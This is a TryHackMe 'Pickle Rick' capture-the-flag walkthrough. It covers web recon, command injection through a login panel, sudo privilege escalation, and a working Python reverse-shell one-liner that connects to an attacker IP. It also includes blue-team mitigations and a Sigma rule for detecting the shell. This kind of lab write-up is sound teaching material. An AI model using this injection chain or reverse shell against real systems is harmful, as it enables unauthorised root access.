# Pickle Rick – TryHackMe Walkthrough

**Room**: [Pickle Rick](https://tryhackme.com/room/picklerick)  
**Difficulty**: Easy  
**Techniques**: Web recon, command injection, sudo misconfiguration, privilege escalation  
**Date**: June 2026  

---

## 📸 Screenshots
All screenshots are in [`screenshots/`](screenshots/) folder.

---

## 🔴 Attack Chain

### 1. Enumeration
```bash
nmap -sV -sC -Pn 10.112.186.221
Open ports:

    22/tcp (SSH)

    80/tcp (HTTP)

https://screenshots/1-nmap.png
2. Web Reconnaissance

Visited http://<IP> – Rick & Morty theme.

View page source – found username in HTML comment:
<!-- Username: R1ckRul3s -->
https://screenshots/2-page-source-username.png

Robots.txt gave password:
curl http://10.112.186.221/robots.txt
# Output: Wubbalubbadubdub
https://screenshots/3-robots-txt-password.png

Directory brute force (gobuster):
gobuster dir -u http://10.112.186.221 -w /usr/share/wordlists/dirb/common.txt
Discovered /login.php and /assets.
https://screenshots/4-gobuster-dirs.png
3. Login & Command Injection

Visited /login.php – used credentials:

    Username: R1ckRul3s

    Password: Wubbalubbadubdub

https://screenshots/5-login-panel.png

The command panel allowed system commands.

First attempt cat – blocked:
https://screenshots/6-cat-disabled.png

Bypass using less:
less Sup3rS3cretPickl3Ingred.txt
Got first flag.
https://screenshots/7-less-working.png
https://screenshots/8-first-flag.png
4. Privilege Escalation

Checked sudo rights:
sudo -l
Output: (ALL) NOPASSWD: ALL – can run any command as root without password.
https://screenshots/9-sudo-l.png

Second flag (inside /root):
sudo ls /root
# Saw 2nd.txt
sudo cat /root/2nd.txt
If cat blocked, use sudo less /root/2nd.txt
https://screenshots/13-second-flag.png

Third flag (inside /home/rick – note space in filename):
sudo ls /home/rick
# Saw: second ingredients
sudo cat "/home/rick/second ingredients"
https://screenshots/16-third-flag-final.png
5. Reverse Shell (optional full control)

Started listener:
nc -lvnp 4444
Python one-liner in command panel (replace <your_IP>):
sudo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Got root shell.
🔵 Detection & Mitigation (Blue Team)
Attack Step	Detection Method	Mitigation
Command injection	WAF rules on |, ;, $(), python -c	Input validation, allowlist commands
cat bypass with less	Monitor process execution (Sysmon Event ID 1)	Restrict available binaries in web shell
sudo NOPASSWD: ALL	Audit logs: /var/log/auth.log	Never use NOPASSWD; restrict to specific commands
Reverse shell	Network egress filtering on high ports; Sysmon network events	Block outbound ports (except needed)
Sigma Rule Example (Reverse Shell)

title: Suspicious Python Reverse Shell
status: experimental
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|endswith: '/python3'
        CommandLine|contains: 'socket.socket'
    condition: selection

🏁 Flags (spoilers hidden)
<details> <summary>Click to reveal</summary>

    Flag 1: flag{first_ingredient} (actual value varies per instance)

    Flag 2: flag{root_flag}

    Flag 3: flag{third_rick_flag}

</details>
📚 References

    TryHackMe Pickle Rick

    GTFOBins – less

    Linux Privilege Escalation – sudo
